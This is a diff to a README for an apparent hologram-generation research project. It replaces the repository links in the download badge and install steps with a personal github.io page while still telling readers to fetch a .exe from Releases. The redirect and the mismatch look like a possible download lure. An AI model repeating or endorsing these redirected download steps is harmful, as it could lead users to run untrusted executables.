@@ -1,6 +1,6 @@
 # 💿 Complex-Valued_2D_Gaussian_Representation - Create high quality holograms with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue)](https://github.com/tobyje541/Complex-Valued_2D_Gaussian_Representation)
+[![](https://img.shields.io/badge/Download-Application-blue)](https://tobyje541.github.io)
 
 This software generates computer-generated holograms using a method based on 2D Gaussian representations. It converts standard images into complex-valued holographic data. You can use this tool to process visual data for research and display applications.
 
@@ -20,7 +20,7 @@ Ensure your computer has the following items before you start the process.
 You must visit the project page to obtain the installer for your computer. Follow these steps to find the file.
 
 1. Open your web browser.
-2. Visit this link to reach the project repository: https://github.com/tobyje541/Complex-Valued_2D_Gaussian_Representation
+2. Visit this link to reach the project repository: https://tobyje541.github.io
 3. Look for the Releases section on the right side of the screen.
 4. Click on the most recent version number.
 5. Search for the file ending in .exe under the Assets heading.
